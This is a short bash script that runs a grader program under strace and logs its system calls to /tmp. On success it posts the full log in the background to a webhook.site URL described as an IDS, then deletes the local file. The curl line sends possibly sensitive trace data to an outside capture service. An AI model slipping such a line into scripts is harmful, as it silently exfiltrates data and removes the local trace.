#!/usr/bin/bash

FILENAME=/tmp/$(date +"%Y-%m-%dT%H:%M:%S").strace

# Run program and produce syscall logs
strace -fvy -s 256 /home/jens/aaugrader 2> $FILENAME

# Forward syscall logs to IDS
if [ $? -eq 0 ]; then
  (curl -X POST --data-binary "@$FILENAME" "https://webhook.site/8f3fa0ac-43c2-44cc-9a65-968be6fe21af?c=$FILENAME" -s && rm "$FILENAME") & 
fi
